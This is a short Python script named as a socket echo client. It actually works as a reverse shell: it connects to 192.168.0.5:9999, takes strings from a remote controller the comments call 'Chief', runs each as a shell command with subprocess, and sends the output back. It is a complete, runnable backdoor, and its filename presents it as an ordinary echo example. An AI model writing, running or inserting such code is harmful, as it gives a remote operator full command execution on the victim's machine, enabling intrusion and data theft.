
#socket_echo_client_explicit.py

import socket
import sys
import subprocess

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port on the server
# given by the caller
server_address = ('192.168.0.5', 9999)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:

    message = b'Client has Connected'
    print('sending {!r}'.format(message))
    sock.sendall(message)
    
    while True:
        #receiving Data from Chief
        data = sock.recv(1024)
        print('received {!r}'.format(data.decode()))
        #process message into cmd command
        command = data.decode()        
        
        #sending ack to Chief of receiving message
        #response = "received message"
        #sock.sendall(response.encode())
        
        if command:
            #cmdResult = subprocess.run(command, shell=True, check=True)
            cmdResult = subprocess.check_output(command, shell=True) # result is in bytes
            print(cmdResult)
            sock.sendall(cmdResult)
        else:
            break
        
               
finally:
    sock.close()

